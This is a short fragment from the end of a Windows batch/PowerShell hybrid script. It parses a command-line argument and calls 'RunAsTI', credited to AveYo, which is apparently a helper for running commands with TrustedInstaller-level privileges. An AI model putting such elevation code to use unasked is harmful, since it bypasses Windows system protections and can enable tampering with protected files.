}; $A=,$env:1-split'"([^"]+)"|([^ ]+)',2|%{$_.Trim(' ')}; RunAsTI $A[1] $A[2]; #:RunAsTI lean & mean snippet by AveYo, 2023.07.06
